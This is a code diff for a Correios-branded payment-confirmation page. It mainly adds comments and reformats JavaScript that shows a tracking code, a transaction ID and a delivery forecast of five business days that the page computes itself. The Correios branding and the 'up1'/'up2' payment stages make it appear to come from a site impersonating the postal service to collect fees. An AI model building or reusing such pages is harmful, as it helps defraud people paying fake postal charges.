@@ -5,18 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="theme-color" content="#16a34a">
     <meta name="description" content="Pagamento Confirmado - Correios">
-
+    
     <title>Pagamento Confirmado - Correios</title>
-
+    
     <!-- Favicon -->
     <link rel="icon" type="image/webp" href="assets/images/favicon.webp">
-
+    
+    <!-- Preload critical CSS + page JS (dispara em paralelo ao HTML parse) -->
     <link rel="preload" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5" as="style">
     <link rel="preload" href="assets/css/sucesso.css?v=2.1.1" as="style">
 
+    <!-- Preload critical FA fonts (parallel with CSS) -->
     <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
     <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
 
+    <!-- Critical CSS fallback (ANTES dos stylesheets externos). Só regras
+         estruturais — sem font-family pra não sobrescrever styles.css.
+         Stylesheets externos sobrescrevem quando carregam; se falharem,
+         este fallback mantém layout básico usável. -->
     <style id="critical-inline">
       *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
       html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;overflow-x:hidden}
@@ -43,7 +49,7 @@
     </style>
     <!-- Font Awesome Pro -->
     <link rel="stylesheet" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5">
-
+    
     <!-- CSS -->
     <link rel="stylesheet" href="assets/css/sucesso.css?v=2.1.1">
 
@@ -92,7 +98,7 @@
                     </div>
                     <span class="status-id" id="transacaoId">---</span>
                 </div>
-
+                
                 <div class="status-timeline">
                     <div class="timeline-item completed">
                         <div class="timeline-dot">
@@ -147,7 +153,7 @@
                         <i class="fas fa-copy"></i>
                     </button>
                 </div>
-
+                
                 <div class="info-card previsao">
                     <div class="info-icon">
                         <i class="fas fa-calendar-check"></i>
@@ -286,6 +292,10 @@
     </div>
 
     <script>
+        // ========================================
+        // HEADER COM NOME DO USUÁRIO
+        // ========================================
+        
         function decodificarNome(nome) {
             if (!nome) return nome;
             try {
@@ -311,69 +321,122 @@
         function exibirNomeHeader() {
             const nome = localStorage.getItem('correios_nome');
             const nomeDecodificado = decodificarNome(nome);
+            
             if (!validarNomeHeader(nomeDecodificado)) return;
+            
             const headerNav = document.getElementById('headerNav');
             const userNameEl = document.querySelector('.btn-entrar .user-name');
+            
             if (!headerNav || !userNameEl) return;
+            
             const primeiroNome = nomeDecodificado.trim().split(/\s+/)[0];
             const formatado = primeiroNome.charAt(0).toUpperCase() + primeiroNome.slice(1).toLowerCase();
+
             userNameEl.textContent = 'Olá, ' + formatado;
             headerNav.classList.add('has-user-name');
         }
 
+        // ========================================
+        // FUNÇÕES UTILITÁRIAS
+        // ========================================
+        
+        // Recupera previsão de entrega salva ou calcula nova
         function getPrevisaoEntrega() {
+            // Primeiro tenta pegar a previsão salva (mais consistente)
             const previsaoSalva = localStorage.getItem('correios_previsao_entrega');
-            if (previsaoSalva) return previsaoSalva;
+            if (previsaoSalva) {
+                return previsaoSalva;
+            }
+            
+            // Fallback: calcula nova previsão (5 dias úteis)
             const hoje = new Date();
             let diasAdicionados = 0;
+            
             while (diasAdicionados < 5) {
                 hoje.setDate(hoje.getDate() + 1);
                 const diaSemana = hoje.getDay();
-                if (diaSemana !== 0 && diaSemana !== 6) diasAdicionados++;
+                if (diaSemana !== 0 && diaSemana !== 6) {
+                    diasAdicionados++;
+                }
             }
+            
             const dia = hoje.getDate().toString().padStart(2, '0');
             const mes = (hoje.getMonth() + 1).toString().padStart(2, '0');
             const ano = hoje.getFullYear();
+            
             const diasSemana = ['Domingo', 'Segunda', 'Terça', 'Quarta', 'Quinta', 'Sexta', 'Sábado'];
-            return `${diasSemana[hoje.getDay()]}, ${dia}/${mes}/${ano}`;
+            const diaSemanaTexto = diasSemana[hoje.getDay()];
+            
+            return `${diaSemanaTexto}, ${dia}/${mes}/${ano}`;
         }
-
+        
+        // Recupera código de rastreio de múltiplas fontes
         function getCodigoRastreio() {
+            // 1. Tenta localStorage específico (mais recente)
             const rastreioSalvo = localStorage.getItem('correios_rastreio');
-            if (rastreioSalvo) return rastreioSalvo;
+            if (rastreioSalvo) {
+                return rastreioSalvo;
+            }
+            
+            // 2. Tenta URL
             const urlParams = new URLSearchParams(window.location.search);
             const rastreioUrl = urlParams.get('rastreio');
-            if (rastreioUrl) return rastreioUrl;
+            if (rastreioUrl) {
+                return rastreioUrl;
+            }
+            
+            // 3. Tenta correios_session
             try {
                 const sessionData = localStorage.getItem('correios_session');
                 if (sessionData) {
                     const parsed = JSON.parse(sessionData);
-                    if (parsed.codigoRastreio) return parsed.codigoRastreio;
+                    if (parsed.codigoRastreio) {
+                        return parsed.codigoRastreio;
+                    }
                 }
             } catch (e) {}
+            
+            // 4. Fallback: gera código aleatório
             return null;
         }
-
+        
         function formatarRastreio(codigo) {
-            if (!codigo) return 'Aguardando atribuição';
+            if (!codigo) {
+                return 'Aguardando atribuição';
+            }
+            
             codigo = codigo.replace(/\s/g, '').toUpperCase();
+            
+            // Formato brasileiro: AA123456789BR
             if (codigo.length === 13 && /^[A-Z]{2}\d{9}[A-Z]{2}$/.test(codigo)) {
                 return codigo.replace(/([A-Z]{2})(\d{3})(\d{3})(\d{3})([A-Z]{2})/, '$1 $2 $3 $4 $5');
             }
+            
             return codigo;
         }
-
+        
+        // Recupera ID da transação de múltiplas fontes
         function getTransacaoId() {
-            const transactionKeys = ['correios_pix_transaction', 'correios_up1_transaction', 'correios_up2_transaction', 'correios_lote_transaction'];
+            // Tenta de várias transações
+            const transactionKeys = [
+                'correios_pix_transaction',
+                'correios_up1_transaction',
+                'correios_up2_transaction',
+                'correios_lote_transaction'
+            ];
+            
             for (const key of transactionKeys) {
                 try {
                     const data = localStorage.getItem(key);
                     if (data) {
                         const parsed = JSON.parse(data);
-                        if (parsed.hash) return parsed.hash.toUpperCase();
+                        if (parsed.hash) {
+                            return parsed.hash.toUpperCase();
+                        }
                     }
                 } catch (e) {}
             }
+            
             return null;
         }
 
@@ -383,6 +446,7 @@
                 ['correios_up1_transaction', 'correios_up1_paid_hash'],
                 ['correios_up2_transaction', 'correios_up2_paid_hash']
             ];
+
             for (const [transactionKey, paidHashKey] of transactionKeys) {
                 try {
                     const data = localStorage.getItem(transactionKey);
@@ -396,7 +460,8 @@
                 } catch (e) {}
             }
         }
-
+        
+        // Formata data/hora
         function formatarDataHora() {
             const agora = new Date();
             const dia = agora.getDate().toString().padStart(2, '0');
@@ -404,35 +469,52 @@
             const ano = agora.getFullYear();
             const hora = agora.getHours().toString().padStart(2, '0');
             const minuto = agora.getMinutes().toString().padStart(2, '0');
+            
             return `${dia}/${mes}/${ano} às ${hora}:${minuto}`;
         }
-
+        
+        // Copiar código de rastreio
         function copiarRastreio() {
             const codigo = document.getElementById('codigoRastreio').textContent;
-            navigator.clipboard.writeText(codigo.replace(/\s/g, '')).then(() => { mostrarToast(); });
+            navigator.clipboard.writeText(codigo.replace(/\s/g, '')).then(() => {
+                mostrarToast();
+            });
         }
-
+        
+        // Mostrar toast
         function mostrarToast() {
             const toast = document.getElementById('toast');
             toast.classList.add('show');
-            setTimeout(() => { toast.classList.remove('show'); }, 2000);
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 2000);
         }
-
+        
+        // ========================================
+        // INICIALIZAÇÃO
+        // ========================================
         document.addEventListener('DOMContentLoaded', function() {
+            // Exibe nome do usuário no header
             exibirNomeHeader();
+            
+            // Preenche dados (buscando de forma consistente)
             document.getElementById('previsaoEntrega').textContent = getPrevisaoEntrega();
             document.getElementById('codigoRastreio').textContent = formatarRastreio(getCodigoRastreio());
             document.getElementById('dataHoraPagamento').textContent = formatarDataHora();
+            
             const transacaoId = getTransacaoId();
             if (transacaoId) {
                 document.getElementById('transacaoId').textContent = '#' + transacaoId.substring(0, 8);
             }
             persistPaidHashes();
+            
+            // Limpa dados de transações do localStorage após exibir
             setTimeout(() => {
                 localStorage.removeItem('correios_pix_transaction');
                 localStorage.removeItem('correios_up1_transaction');
                 localStorage.removeItem('correios_up2_transaction');
                 localStorage.removeItem('correios_lote_transaction');
+                // Mantém correios_rastreio e correios_previsao_entrega para caso o usuário recarregue
             }, 2000);
         });
     </script></body>
